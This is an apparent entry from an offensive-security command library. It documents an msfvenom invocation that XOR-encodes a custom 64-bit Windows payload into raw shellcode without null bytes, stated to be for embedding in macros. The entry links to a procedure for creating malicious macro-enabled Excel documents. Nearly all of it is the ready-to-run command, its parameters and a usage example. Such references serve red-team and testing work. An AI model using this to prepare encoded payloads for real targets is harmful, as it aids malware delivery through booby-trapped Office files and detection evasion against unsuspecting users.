---
id: dfc2562c-6067-4630-97de-7122ec72274e-2
name: msfvenom-encode-x64-custom-payload
type: command
executor: bash
data: >-
  msfvenom -p generic/custom PAYLOADFILE=$_PAYLOAD_FILE -a x64 --platform
  windows -e x64/xor_dynamic -f raw -o shellcode-64.bin -b '\x00'
output: null
created_at: '2023-04-06T03:56:23.232623+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - payload-generation
  - msfvenom
verified: true
validated: true
---

# msfvenom-encode-x64-custom-payload

## Command

```bash
msfvenom -p generic/custom PAYLOADFILE=$_PAYLOAD_FILE -a x64 --platform windows -e x64/xor_dynamic -f raw -o shellcode-64.bin -b '\x00'
```

## Description

Encodes a custom 64-bit payload using dynamic XOR for macro embedding, avoiding null bytes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -p generic/custom | Custom payload type | Yes |
| PAYLOADFILE=$_PAYLOAD_FILE | Input file path (e.g., payload64.bin) | Yes |
| -a x64 | 64-bit arch | Yes |
| --platform windows | Windows | Yes |
| -e x64/xor_dynamic | Dynamic XOR encoder | Yes |
| -f raw | Raw format | Yes |
| -o shellcode-64.bin | Output | Yes |
| -b '\x00' | Avoid nulls | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic -f raw -o shellcode-64.bin -b '\x00'
```

## Expected Output

shellcode-64.bin created; minimal console output.

## Related

- [[procedures/Create-Malicious-Macro-Enabled-Excel-Documents-with-Macrome]]
- [[tools/msfvenom]]
